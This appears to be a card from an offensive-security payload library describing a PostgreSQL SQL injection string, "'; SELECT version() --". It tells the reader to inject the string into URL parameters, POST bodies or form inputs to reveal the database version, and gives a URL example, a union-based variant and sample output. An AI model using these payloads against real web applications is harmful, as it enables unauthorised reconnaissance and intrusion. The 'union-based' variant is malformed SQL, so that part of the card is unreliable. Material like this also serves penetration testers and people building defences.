---
id: 61507690-b5bd-4869-a45f-beb6c8b9ff96
name: postgresql-select-version
type: command
executor: sql
data: '''; SELECT version() --'
output: null
created_at: '2023-04-06T03:56:35.420525+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - sqli
  - postgresql
  - version-enumeration
verified: true
validated: true
---

# postgresql-select-version

## Command

```sql
'; SELECT version() --
```

## Description

This SQL command is a payload designed for injection into a vulnerable web application parameter to retrieve the PostgreSQL database version. It terminates the original query, executes the version function, and neutralizes trailing SQL with a comment. Use this in contexts like URL parameters, POST bodies, or form inputs where SQL injection is possible.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `;` | Terminates the preceding SQL statement | Yes |
| `SELECT version()` | Built-in PostgreSQL function to return the full server version string | Yes |
| `--` | SQL comment to ignore the rest of the line | Yes |

## Examples

### Basic Usage

In a URL parameter (e.g., search?q=):

```sql
search?q=admin'; SELECT version() --
```

### Advanced Usage (Union-Based)

For union injection:

```sql
'; UNION SELECT version() --
```

## Expected Output

The response will include the PostgreSQL version string, such as:

```
PostgreSQL 14.5 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 10.2.1 20210110, 64-bit
```

In error-based injection, this may appear in the error message; in union-based, it populates a result column.

## Related

- [[procedures/PostgreSQL-Version-Retrieval-via-SQL-Injection]]
- [[techniques/Exploit Public-Facing Application|T1190]]
